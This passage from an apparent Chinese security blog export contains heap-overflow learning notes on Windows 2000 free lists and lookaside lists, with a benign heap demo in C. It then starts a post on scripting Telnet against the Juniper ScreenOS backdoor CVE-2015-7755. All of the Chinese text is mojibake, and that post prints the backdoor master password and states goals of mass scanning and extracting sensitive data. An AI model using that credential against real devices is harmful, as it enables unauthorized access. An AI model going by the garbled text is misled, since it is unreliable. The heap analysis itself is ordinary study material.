æ­¤æˆ‘çš„è§£å†³åŠæ³•æ˜¯æ‰‹åŠ¨å°†int3æ”¹å˜ä¸ºnopï¼Œæ‰§è¡Œç©ºæŒ‡ä»¤ï¼Œè¿™æ ·å°±å¯ä»¥ç»§ç»­æ‰§è¡Œåé¢çš„ä»£ç äº†ï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¸æ–¹ä¾¿çš„åœ°æ–¹ï¼Œæ¯æ¬¡é‡å¯ç¨‹åºæ‰§è¡Œåˆ°è¯¥å¤„éƒ½å¾—æ‰‹åŠ¨ä¿®æ”¹æ­¤å¤„ã€‚</p><p>è¿ç»­å‡ æ¬¡F8ä»£ç æ‰§è¡Œåˆ°0x0040102Bå¤„ï¼Œå³å®Œæˆh1å †å†…å­˜åˆ†é…ä¹‹åï¼Œå¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/1_1_6.png" class="" title="å›¾1.1.6"><p>ä»ä¸Šå›¾ä¸­å¯ä»¥è§‚å¯Ÿåˆ°ï¼Œh1çš„å †å†…å­˜åœ°å€æ˜¯ä¹‹å‰çš„ç©ºé—²å°¾å—çš„èµ·å§‹åœ°å€0x688ï¼Œé‚£åŸæ¥çš„å°¾å—ä½•å»ä½•ä»ï¼Ÿè¿™æ—¶å¯ä»¥å†è§‚å¯Ÿä¸€ä¸‹ç©ºè¡¨ç´¢å¼•åŒºï¼Œå¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/1_1_7.png" class="" title="å›¾1.1.7"><p>ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼ŒFreelist[0]æ‰€æŒ‡å‘çš„ç©ºé—²å°¾å—çš„èµ·å§‹åœ°å€å˜ä¸º0x698ã€‚å†åˆ°åœ°å€0x680è¿›è¡Œè§‚å¯Ÿï¼Œå¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/1_1_8.png" class="" title="å›¾1.1.8"><p>å¯ä»¥çœ‹åˆ°ï¼Œå°¾å—å˜å°åˆ° 0x12E x 8 Byteäº†ï¼Œç¼©å°äº†(0x130 - 0x12E) x 8 Byte = 16 Byteï¼Œè¿™16 Byteå³ä¸ºh1æ‰€ç”¨ï¼Œè™½ç„¶åœ¨Cä»£ç ä¸­h1ç”³è¯·å¤§å°ä»…ä¸º3 Byteï¼Œä½†æ˜¯æ®å‰æ‰€è¿°ï¼Œå †å—æ•°æ®çš„æœ€å°å ç”¨å†…å­˜ä¸º 8 Byteï¼Œå› æ­¤åŒ…æ‹¬å—é¦–çš„h1è¿˜æ˜¯å ç”¨äº†16 Byteçš„å†…å­˜ç©ºé—´ã€‚ç”±äºh1ä»…ç”³è¯·äº†3 Byteï¼Œå› æ­¤0x688çš„å‰4 Byteè¢«ç½®ä¸º0ï¼Œè€Œå4 Byteä¸åšæ”¹å˜ä¹Ÿä¸ä¼šè¢«ä½¿ç”¨ï¼Œæ‰€ä»¥å…¶å€¼ä»ä¸ºä¹‹å‰çš„å°¾å—çš„åå‘æŒ‡é’ˆçš„å€¼ã€‚</p><p>éšåçš„h2-h6åˆ†é…è¿‡ç¨‹ç±»ä¼¼ï¼Œä¸å†èµ˜è¿°ï¼Œä¸‹é¢ä¸¤å›¾ç»™å‡ºh6åˆ†é…å®Œæ¯•åçš„ç©ºè¡¨ç´¢å¼•åŒºåŠå¯¹æ•°æ®åŒºçš„çŠ¶æ€:</p><img data-src="/tech/heap-overflow-learning-notes-1/1_1_9.png" class="" title="å›¾1.1.9"><img data-src="/tech/heap-overflow-learning-notes-1/1_1_10.png" class="" title="å›¾1.1.10"><h4 id="4-è§‚å¯Ÿå †å—çš„é‡Šæ”¾"><a href="#4-è§‚å¯Ÿå †å—çš„é‡Šæ”¾" class="headerlink" title="(4) è§‚å¯Ÿå †å—çš„é‡Šæ”¾"></a>(4) è§‚å¯Ÿå †å—çš„é‡Šæ”¾</h4><p>æ¥ç€è§‚å¯Ÿå †å—çš„é‡Šæ”¾ï¼ŒCä»£ç ä¸­é¦–å…ˆé‡Šæ”¾çš„æ˜¯3ä¸ªä¸ç›¸é‚»çš„å †å—h1 h3 h5ï¼Œç”±äºå®ƒä»¬ä¸è¿ç»­ï¼Œå› æ­¤ä¸ä¼šå‘ç”Ÿåˆå¹¶ã€‚</p><p>å°†æ±‡ç¼–ä»£ç æ‰§è¡Œåˆ°h5é‡Šæ”¾å®Œæ¯•ï¼Œh6å¼€å§‹é‡Šæ”¾ä¹‹å‰ï¼Œè§‚å¯Ÿç©ºè¡¨ç´¢å¼•åŒºåŠå †æ•°æ®åŒºçš„çŠ¶æ€ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/1_1_11.png" class="" title="å›¾1.1.11"><img data-src="/tech/heap-overflow-learning-notes-1/1_1_12.png" class="" title="å›¾1.1.12"><p>ç”±äºh1å’Œh3çš„Self Sizeéƒ½ä¸º2ä¸”ä¸ç›¸é‚»ï¼Œå½“å®ƒä»¬è¢«é‡Šæ”¾æ—¶ä¼šå…ˆåä¸Freelist[2]ä¸²è”æ„æˆåŒå‘é“¾è¡¨ï¼Œå…·ä½“çš„é“¾æ¥æ–¹å¼ä¸º</p><ul><li>flink: FreeList[2] -&gt; h1 -&gt; h3 -&gt; FreeList[2]</li><li>blink: FreeList[2] -&gt; h3 -&gt; h1 -&gt; FreeList[2]</li></ul><p>é‡Šæ”¾åçš„h5è¢«å•ç‹¬ä¸²è”åˆ°Freelist[4]ã€‚</p><p>å¯ä»¥è§‚å¯Ÿåˆ°åœ¨åˆ†é…åŠé‡Šæ”¾å‰åï¼Œh1 h3 h5çš„å—é¦–ä¸­ä»å·¦è‡³å³ç¬¬6 Byteçš„æ•°æ®ç”±0x01å˜ä¸º0x00ï¼Œè¯¥å­—èŠ‚æ•°æ®ä¸ºå †å—æ ‡è¯†ï¼Œå€¼0x01è¡¨ç¤ºè¯¥å—å¤„äºBusyçŠ¶æ€ã€‚å¤„äºBusyçŠ¶æ€çš„ç©ºé—²å †å—ä¸ä¼šè¢«åˆå¹¶ï¼Œè€Œ0x00çŠ¶æ€çš„ç©ºé—²å †å—åœ¨åˆé€‚çš„æ—¶å€™ä¼šè¢«ç³»ç»Ÿè‡ªåŠ¨åˆå¹¶ã€‚</p><h4 id="5-è§‚å¯Ÿå †å—çš„åˆå¹¶"><a href="#5-è§‚å¯Ÿå †å—çš„åˆå¹¶" class="headerlink" title="(5) è§‚å¯Ÿå †å—çš„åˆå¹¶"></a>(5) è§‚å¯Ÿå †å—çš„åˆå¹¶</h4><p>ç»§ç»­æ‰§è¡Œé‡Šæ”¾h4çš„ä»£ç ï¼Œå½“h4è¢«é‡Šæ”¾åï¼Œè§‚å¯Ÿç©ºè¡¨ç´¢å¼•åŒºåŠå †æ•°æ®åŒºï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/1_1_13.png" class="" title="å›¾1.1.13"><img data-src="/tech/heap-overflow-learning-notes-1/1_1_14.png" class="" title="å›¾1.1.14"><p>h4è¢«é‡Šæ”¾åï¼Œç³»ç»Ÿå¹¶ä¸ä¼šæŠŠå®ƒä¸Freelist[4]ä¸²è”ï¼Œå› ä¸ºç³»ç»Ÿæ£€æµ‹åˆ°h4 å‰ä¸h3 åä¸h4ç›¸é‚»ï¼Œä¼šå°†å®ƒä»¬åˆå¹¶ï¼Œåˆå¹¶åæ–°ç©ºé—²å—çš„å¤§å°ä¸º(2+2+4) x 8 Byte = 8 x 8 Byteï¼Œå› æ­¤æ–°å—çš„Self Sizeä¸º8ã€‚</p><p>åŒæ—¶è§‚å¯Ÿç©ºè¡¨ç´¢å¼•åŒºï¼Œç”±äºh3è¢«â€œæ‹¿èµ°â€ï¼Œä¸Freelist[2]ä¸²è”çš„åªå‰©ä¸‹äº†h1ï¼ŒåŸå…ˆä¸Freelist[4]ä¸²è”çš„h5ä¹Ÿè¢«â€œæ‹¿èµ°â€ï¼Œå› æ­¤Freelist[4]ä¸­çš„æŒ‡é’ˆå†æ¬¡æŒ‡å‘äº†å®ƒè‡ªèº«ï¼Œè€Œåˆå¹¶å¾—åˆ°çš„Self Sizeä¸º8çš„æ–°å—ä¸Freelist[8]è¿›è¡Œäº†ä¸²æ¥ã€‚ </p><h3 id="2-å¿«é€Ÿå•å‘é“¾è¡¨Lookaside"><a href="#2-å¿«é€Ÿå•å‘é“¾è¡¨Lookaside" class="headerlink" title="2. å¿«é€Ÿå•å‘é“¾è¡¨Lookaside"></a>2. å¿«é€Ÿå•å‘é“¾è¡¨Lookaside</h3><blockquote><p>å¿«è¡¨æ˜¯Windowsç”¨æ¥åŠ é€Ÿå †å—åˆ†é…è€Œé‡‡ç”¨çš„ä¸€ç§å †è¡¨ã€‚è¿™é‡Œä¹‹æ‰€ä»¥æŠŠå®ƒå«åšâ€œå¿«è¡¨â€æ˜¯å› ä¸ºè¿™ç±»å•å‘é“¾è¡¨ä¸­ä»æ¥ä¸ä¼šå‘ç”Ÿå †å—åˆå¹¶ï¼ˆå…¶ä¸­çš„ç©ºé—²å—å—é¦–è¢«è®¾ç½®ä¸ºå ç”¨æ€ï¼Œç”¨æ¥é˜²æ­¢å †å—åˆå¹¶ï¼‰ã€‚</p><p>å¿«è¡¨ä¹Ÿæœ‰128æ¡ï¼Œç»„ç»‡ç»“æ„ä¸ç©ºè¡¨ç±»ä¼¼ï¼Œåªæ˜¯å…¶ä¸­çš„å †å—æŒ‰ç…§å•é“¾è¡¨ç»„ç»‡ã€‚å¿«è¡¨æ€»æ˜¯è¢«åˆå§‹åŒ–ä¸ºç©ºï¼Œè€Œä¸”æ¯æ¡å¿«è¡¨æœ€å¤šåªæœ‰4ä¸ªèŠ‚ç‚¹ï¼Œæ•…å¾ˆå¿«å°±ä¼šè¢«å¡«æ»¡ã€‚</p><footer><strong>ç‹æ¸…</strong><cite>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -> P148-149</cite></footer></blockquote><p>å¿«è¡¨ç»“æ„å¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/0day_5_1_3.png" class="" title="ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -&gt; P148 -&gt; å›¾5.1.3"><p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><figcaption><span>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -> P161 -> heap_lookaside.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC code of chapter 5 in book "Lookaside Using"</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">file name: heap_lookaside.c</span></span><br><span class="line"><span class="comment">author: failwest  </span></span><br><span class="line"><span class="comment">date: 2010.09.04</span></span><br><span class="line"><span class="comment">description: demo show of how heap works</span></span><br><span class="line"><span class="comment">Noticed:1 only run on windows 2000</span></span><br><span class="line"><span class="comment">2 complied with VC 6.0</span></span><br><span class="line"><span class="comment">3 build into release version</span></span><br><span class="line"><span class="comment">4 only used for run time debugging</span></span><br><span class="line"><span class="comment">version: 1.0</span></span><br><span class="line"><span class="comment">E-mail: failwest@gmail.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Only for educational purposes    enjoy the fun from exploiting :)</span></span><br><span class="line"><span class="comment">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HLOCAL h1,h2,h3,h4;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h1);</span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h3);</span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h4);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ç¯å¢ƒå¦‚ä¸‹ï¼š</p><ul><li>æ“ä½œç³»ç»Ÿï¼šè¿è¡ŒäºVmwareè™šæ‹Ÿæœºï¼Œç‰ˆæœ¬Win 2K SP4 5.00.2195 EN</li><li>ç¼–è¯‘å™¨ï¼šVisual C++ 6.0</li><li>ç¼–è¯‘é€‰é¡¹ï¼šé»˜è®¤é€‰é¡¹</li><li>buildç‰ˆæœ¬ï¼šreleaseç‰ˆ</li></ul><p>æœ¬ä¾‹ä¸­åˆ›å»ºå †ä¸ä¸Šä¾‹ä¸­åˆ›å»ºå †æ—¶çš„ä¸åŒä¹‹å¤„åœ¨äºHeapCreateå‡½æ•°çš„ä½¿ç”¨ï¼Œè¯¥å‡½æ•°ç»†èŠ‚è¯¦è§<span class="exturl" data-url="aHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vemgtY24vbGlicmFyeS9hYTM2NjU5OQ==">MSDN<i class="fa fa-external-link-alt"></i></span>ï¼Œè¯¥å‡½æ•°çš„ç¬¬3ä¸ªå‚æ•°dwMaximumSizeæŒ‡å®šäº†è¯¥å †æ‰€èƒ½å ç”¨çš„æœ€å¤§ç©ºé—´ï¼Œè‹¥dwMaximumSize=0ï¼Œåˆ™å°†ä¼šåˆ›å»ºä¸€ä¸ªæŒ‰æ‰€éœ€ç©ºé—´å¤§å°åŠ¨æ€è‡ªå¢é•¿çš„å †ã€‚</p><p>0dayä¹¦ä¸­æ²¡æœ‰æŒ‡å‡ºæ˜¯å¦åœ¨è°ƒç”¨HeapCreateæ—¶ï¼Œå°†dwMaximumSizeè®¾ç½®ä¸º0æ—¶ç³»ç»Ÿå°±ä¼šè‡ªåŠ¨å¯ç”¨å¿«è¡¨ï¼Œè€Œç½®ä¸ºéé›¶æ—¶ç³»ç»Ÿé»˜è®¤ä¸ä½¿ç”¨å¿«è¡¨ï¼Œæ ¹æ®æˆ‘çš„ç†è§£åº”è¯¥æ˜¯è¿™æ ·çš„ã€‚</p><p><strong>åœ¨å®éªŒè°ƒè¯•ä¸­ï¼Œæˆ‘å‘ç°0dayä¹¦ä¸­5.2.7 â€œå¿«è¡¨çš„ä½¿ç”¨â€ä¸€èŠ‚ä¸­æœ‰è¾ƒä¸ºæ˜æ˜¾çš„é”™è¯¯ï¼Œè€Œåè¿é”ååº”å¼åœ°åœ¨æœ¬èŠ‚ä¸­å¼•å‘äº†ä¸€è¿ä¸²é”™è¯¯ã€‚ä¸€å¼€å§‹è¿˜ä¸æ•¢ç¡®å®šï¼Œåæ¥ç»è¿‡åå¤è°ƒè¯•å¹¶é˜…è¯»ï¼ŒåŸºæœ¬ç¡®å®šé”™è¯¯å±å®è€Œéç¯å¢ƒä¸åŒé€ æˆçš„ç»“æœå·®å¼‚ï¼Œä¸‹æ–‡å°†è¯¦è¿°ä¹‹ã€‚</strong></p><h4 id="1-è§‚å¯Ÿå †è¡¨ä¿¡æ¯"><a href="#1-è§‚å¯Ÿå †è¡¨ä¿¡æ¯" class="headerlink" title="(1) è§‚å¯Ÿå †è¡¨ä¿¡æ¯"></a>(1) è§‚å¯Ÿå †è¡¨ä¿¡æ¯</h4><p>0x178å¤„å­˜å‚¨çš„å°¾å—æŒ‡é’ˆä¸å†æŒ‡å‘0x688ï¼Œå¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/1_2_1.png" class="" title="å›¾1.2.1"><blockquote><p>è¿™é‡Œæ’æ’­ä¸€ä¸ªåœ¨å­¦ä¹ è¿‡ç¨‹ä¸­å‘ç°çš„OllyDBGä½¿ç”¨å°Tipsï¼Œä¹‹å‰æ²¡çœ‹è¿‡OllyDBGçš„ä½¿ç”¨æ–‡æ¡£ï¼Œä¸€äº›æœ€åŸºæœ¬çš„æ“ä½œéƒ½æ˜¯ä»0dayä¹¦ä¸­å­¦ä¹ åˆ°çš„ï¼Œå› æ­¤å·²ç»ç†Ÿæ‚‰OllyDBGä½¿ç”¨çš„åŒå­¦å¯å¿½ç•¥è¿™æ¡Tipsã€‚</p><p>è§‚å¯Ÿä¸Šå›¾ä¸­0x178å¤„æŒ‡é’ˆæŒ‡å‘çš„å°¾å—åœ°å€0x00361E90ï¼Œè‹¥æˆ‘ä»¬æƒ³è¦è·³è½¬åˆ°è¯¥åœ°å€å»æŸ¥çœ‹å°¾å—ï¼Œå¯ä»¥æŒ‰ç…§0dayä¹¦ä¸­çš„æ–¹æ³•åœ¨ä¸Šå›¾çš„å†…å­˜æŸ¥çœ‹çª—å£ä¸­æŒ‰ä¸‹Ctrl+Gï¼Œç„¶åé”®å…¥361E90ï¼ˆé»˜è®¤16è¿›åˆ¶ï¼‰ï¼Œå°±èƒ½å¤Ÿè½¬åˆ°è¯¥åœ°å€æŸ¥çœ‹å†…å­˜ã€‚</p><p>æ­¤å¤–ï¼Œè¿˜å¯ä»¥ç”¨é¼ æ ‡å³é”®å•å‡»å†…å­˜0x178å¤„çš„å€¼0x90ï¼Œé€‰æ‹©â€Follow DWORD in Dumpâ€ï¼Œå³å¯è·³è½¬åˆ°å†…å­˜0x00361E90å¤„ã€‚è¿˜å¯ä»¥é€šè¿‡å•å‡»+æˆ–-ä»¥æ¥å›åˆ‡æ¢å‰é¢çš„æˆ–åé¢çš„å†…å­˜çª—å£æŸ¥çœ‹ï¼Œä»¥å®ç°0x178å’Œ0x1E90å¤„å†…å­˜çš„å¿«é€Ÿæ¥å›åˆ‡æ¢æŸ¥çœ‹ã€‚</p></blockquote><p>0x688å¤„å·²ç»è¢«å¿«è¡¨æ‰€éœ¸å ï¼Œå¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/1_2_2.png" class="" title="å›¾1.2.2"><blockquote><p>ä¸ä¸Šå›¾å¯¹åº”çš„0dayä¹¦ä¸­å›¾5.2.17æ ‡æ³¨çš„Lookaside[0]ä½äº0x6b8å¤„è€Œé0x688å¤„ï¼Œä¹¦ä¸­çš„æ ‡æ³¨æœ‰è¯¯ã€‚</p></blockquote><h4 id="2-è§‚å¯Ÿå †å—çš„åˆ†é…"><a href="#2-è§‚å¯Ÿå †å—çš„åˆ†é…" class="headerlink" title="(2) è§‚å¯Ÿå †å—çš„åˆ†é…"></a>(2) è§‚å¯Ÿå †å—çš„åˆ†é…</h4><p>æ¥ç€ï¼Œæˆ‘ä»¬æ¥è§‚å¯Ÿå †å—åˆ†é…æ“ä½œï¼Œè§‚å¯Ÿh1ç”³è¯·åçš„å†…å­˜ï¼Œå¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/1_2_3.png" class="" title="å›¾1.2.3"><p>æ­¤æ—¶0x178å¤„çš„å°¾å—æŒ‡é’ˆæŒ‡å‘0x1EA0ï¼Œè¯´æ˜è·Ÿä¸ŠèŠ‚ä¸­è®¨è®ºçš„ç©ºè¡¨å†…å­˜ç”³è¯·ä¸€æ ·ï¼Œç”³è¯·è¿‡ç¨‹ä¹Ÿæ˜¯Freelist[0]æ‰€æŒ‡å‘çš„å°¾å—ä¸ºh1è…¾å‡ºäº†ç©ºé—´ï¼Œç»“æœè¡¨ç°ä¸ºå°¾å—ç¼©å° 2 x 8 Byteï¼Œå®ƒçš„èµ·å§‹éƒ¨åˆ†â€œå‘åç§»åŠ¨â€äº†ã€‚</p><p>æ¥ç€æ‰§è¡Œä»£ç ï¼Œå®Œæˆh1è‡³h4çš„åˆ†é…ï¼Œè§‚å¯Ÿæ­¤æ—¶å†…å­˜æ•°æ®ï¼Œå¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/1_2_4.png" class="" title="å›¾1.2.4"><h4 id="3-è§‚å¯Ÿå †å—çš„é‡Šæ”¾"><a href="#3-è§‚å¯Ÿå †å—çš„é‡Šæ”¾" class="headerlink" title="(3) è§‚å¯Ÿå †å—çš„é‡Šæ”¾"></a>(3) è§‚å¯Ÿå †å—çš„é‡Šæ”¾</h4><p>å†è§‚å¯Ÿh1è‡³h4é‡Šæ”¾åçš„å†…å­˜æ•°æ®ï¼Œå¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/1_2_5.png" class="" title="å›¾1.2.5"><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸ç©ºè¡¨ä¸­ä¸åŒçš„æ˜¯ï¼Œåœ¨é‡Šæ”¾åå„å—å—é¦–ä¸­ä»å·¦è‡³å³ç¬¬6 Byteçš„æ•°æ®å¹¶æœªæ”¹å˜ï¼Œä»ä¸º0x01å³BusyçŠ¶æ€ï¼Œè¯¥æ ‡è¯†å¯ä»¥ä¿è¯å³ä½¿è¯¥å †å—ç°åœ¨å·²å˜ä¸ºç©ºé—²å †å—ä¹Ÿä¸ä¼šè¢«ç³»ç»Ÿè‡ªåŠ¨åˆå¹¶ã€‚</p><p>å…¶ä¸­ï¼Œè¢«é‡Šæ”¾åçš„h2ä¸­å¤šå‡ºäº†ä¸€ä¸ªæŒ‡é’ˆï¼Œå…³äºå…¶ç”¨é€”ï¼Œå¾…è§‚å¯Ÿ0x688å¤„çš„å¿«è¡¨å³å¯æ˜ç™½ï¼Œå¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-1/1_2_6.png" class="" title="å›¾1.2.6"><p>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œè¢«é‡Šæ”¾åçš„å„å—è¢«é“¾å…¥å¿«è¡¨ä¸­ï¼Œå½¢æˆäº†3æ¡å•å‘é“¾è¡¨ï¼š</p><ul><li>Lookaside[2] -&gt; h2 -&gt; h1</li><li>Lookaside[3] -&gt; h3</li><li>Lookaside[4] -&gt; h4</li></ul><blockquote><p>0dayä¹¦ä¸­å›¾5.2.20æ ‡æ³¨çš„Lookaside[1], Lookaside[2], Lookaside[3]åˆ†åˆ«ä½äº0x6E8 0x718 0x748ï¼Œä¹¦ä¸­çš„æ ‡æ³¨æœ‰è¯¯ã€‚</p></blockquote><p>è¿è¡Œä¹‹åçš„ä»£ç ï¼ŒCä»£ç ä¸­çš„æ–°h2éœ€è¦16 Byteç©ºé—´ï¼ŒåŠ ä¸Šå—é¦–ï¼Œéœ€å  (2+1) x 8 Byteç©ºé—´ï¼Œå› æ­¤åœ¨åˆ†é…æ—¶å·²è¢«é“¾å…¥Lookaside[3]çš„ä¹‹å‰h3çš„å†…å­˜0x1EB0å°†è¢«æ–°h2æ‰€ä½¿ç”¨ï¼Œ0x718å¤„çš„æŒ‡é’ˆåœ¨åˆ†é…å®Œæ¯•åå°†è¢«ç½®0ï¼Œåœ¨æ–°h2è¢«é‡Šæ”¾åè¯¥å¤„æŒ‡é’ˆåˆä¼šæ¢å¤ï¼Œæ•´ä¸ªè¿‡ç¨‹è¾ƒä¸ºç®€å•ï¼Œä¸å†èµ˜è¿°ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Bin </tag>
            
            <tag> Heap Overflow </tag>
            
            <tag> OllyDBG </tag>
            
            <tag> Security </tag>
            
            <tag> Windows </tag>
            
            <tag> Windows 2000 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonå®ç°ç»ˆç«¯äº¤äº’ â€”â€” ä»¥Juniperåé—¨CVE-2015-7755ä¸ºä¾‹ï¼ˆä¸€ï¼‰: Telnetç¯‡</title>
      <link href="/tech/shell-interaction-in-python-1-telnet/"/>
      <url>/tech/shell-interaction-in-python-1-telnet/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Shell Interaction in Python #1: Telent</strong></em></li><li>Author: dog2</li></ul><hr><h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><p>æˆ‘ä»¬å¸¸å¸¸éœ€è¦ä½¿ç”¨ç¼–ç¨‹è¯­è¨€å®ç°ä¸æŸäº›ç»ˆç«¯äº¤äº’ï¼Œä»¥å®ç°äº¤äº’è¿‡ç¨‹çš„å¯æ§æ€§ã€‚å…·ä½“åˆ°è¿™ç±»æ¶‰åŠç»ˆç«¯äº¤äº’çš„æ¼æ´ï¼Œåªæœ‰ç¼–å†™åˆé€‚çš„PoC/Expï¼Œå¹¶ä¸ç›®æ ‡æœ‰æ­£ç¡®çš„äº¤äº’é€»è¾‘ï¼Œæ‰èƒ½è¿›è¡Œæ¼æ´éªŒè¯ã€‚</p><p>è¿™é‡Œï¼Œæˆ‘ä»¬ä»¥Juniperåé—¨æ¼æ´CVE-2015-7755ä¸ºä¾‹ï¼Œä»‹ç»å¦‚ä½•ä½¿ç”¨Pythonç¼–å†™Telnetäº¤äº’ç¨‹åºï¼Œä¸”:</p><ul><li>è¦æ±‚è¯¥ç¨‹åºæ˜¯å¯ä»¥ç”¨äºé«˜å¹¶å‘æ‰«æçš„ã€‚</li><li>å®ç°Expï¼Œè·å–ç›¸å…³æ•æ„Ÿä¿¡æ¯ã€‚</li></ul><p>Juniperåé—¨æ¼æ´ç›¸å…³ä¿¡æ¯å¯å‚è§<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9uZXdzLzkwMzIzLmh0bWw=">Freebufç›¸å…³æ–‡ç« <i class="fa fa-external-link-alt"></i></span>ã€‚ç®€è€Œè¨€ä¹‹ï¼Œå³å¯ä½¿ç”¨ä»»æ„ç”¨æˆ·ååŠå¯†ç  <strong>*&lt;&lt;&lt; %s(un=â€™%sâ€™) = %u*</strong> æ¥ç™»å½•ä¸€äº›Juniper ScreenOSè®¾å¤‡çš„TelnetåŠSShæœåŠ¡ã€‚</p><h3 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h3><h4 id="æ¨¡å—é€‰æ‹©"><a href="#æ¨¡å—é€‰æ‹©" class="headerlink" title="æ¨¡å—é€‰æ‹©"></a>æ¨¡å—é€‰æ‹©</h4><p>åˆç‰ˆPoCç¨‹åºæˆ‘ä½¿ç”¨äº†ç›¸å¯¹åº•å±‚çš„socketæ¨¡å—æ¥ç®€å•å®ç°ï¼Œç”¨äºæ£€æµ‹å•ä¸ªç›®æ ‡æ²¡æœ‰é—®é¢˜ï¼Œä½†åœ¨é«˜å¹¶å‘æ‰«æçš„æ—¶å€™æ•ˆç‡æä½ï¼ŒçŒœæµ‹æ˜¯I/Oé˜»å¡çš„åŸå› ã€‚</p><p>è½¬è€Œä½¿ç”¨ç³»ç»Ÿåº“å†…ç½®æ¨¡å—telnetlibï¼š</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L3RlbG5ldGxpYi5odG1s">æ–‡æ¡£<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvMi43L0xpYi90ZWxuZXRsaWIucHk=">æºç <i class="fa fa-external-link-alt"></i></span></li></ul><p>ä½¿ç”¨telnetæ¨¡å—åå¹¶å‘æ‰«æçš„æ•ˆç‡å°±éå¸¸é«˜äº†ï¼ŒCPUåŠå¸¦å®½å ç”¨ç‡éƒ½ä¸Šå»äº†ã€‚ç®€å•ç¿»é˜…telnetlibçš„æºç 